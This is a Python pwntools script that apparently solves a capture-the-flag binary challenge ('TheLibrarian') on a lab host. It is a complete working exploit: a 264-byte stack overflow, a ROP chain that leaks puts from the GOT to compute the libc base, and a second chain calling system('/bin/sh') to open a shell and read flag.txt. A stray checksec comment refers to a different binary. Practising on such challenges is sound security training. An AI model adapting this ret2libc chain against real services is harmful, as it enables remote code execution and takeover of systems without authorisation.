import pwn
from pwn import context, remote, process, p32, p64, asm, shellcraft, ROP, u64

# checksec --file materials-TryPwnMeOne/TryOverFlowMe1/overflowme1 
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

context.binary = binary = pwn.ELF('materials-TryPwnMeOne/TheLibrarian/thelibrarian', checksec=False)
libc = pwn.ELF("./materials-TryPwnMeOne/TheLibrarian/libc.so.6", checksec=False)

payload = b''

#p = process()
p = remote("10.10.237.195", 9008)

rop = ROP(binary)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

# 265 array + 8 bytes RBP
payload = (b'A' * 264)
# insert ret
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(binary.got["puts"])  # value for rdi
payload += p64(binary.plt["puts"])
payload += p64(binary.symbols["vuln"])

p.recvuntil(b"Again? Where this time? : ")
p.sendline(payload)
p.recvuntil(b"ok, let's go!\n\n")

leaked_puts = u64(p.recvline().rstrip().ljust(8, b"\x00"))
print(f"[+] Leaked address of puts from the GOT entry: {hex(leaked_puts)}")
libc_base_address = leaked_puts - libc.symbols["puts"] # calculate the base address of libc
print(f"[+] Calculated base address of libc: {hex(libc_base_address)}")

print(f"[+] Calculated the base address of LIBC: {hex(libc_base_address)}")
libc.address = libc_base_address

p.recvuntil(b"Again? Where this time? : ")
payload2 = b"A" * 264
payload2 += p64(pop_rdi_ret)
payload2 += p64(next(libc.search(b"/bin/sh")))
payload2 += p64(libc.symbols["system"]) 

p.sendline(payload2)
p.recvuntil(b"ok, let's go!\n\n")

p.sendline(b"cat flag.txt")
print(p.recvline().decode())
p.close()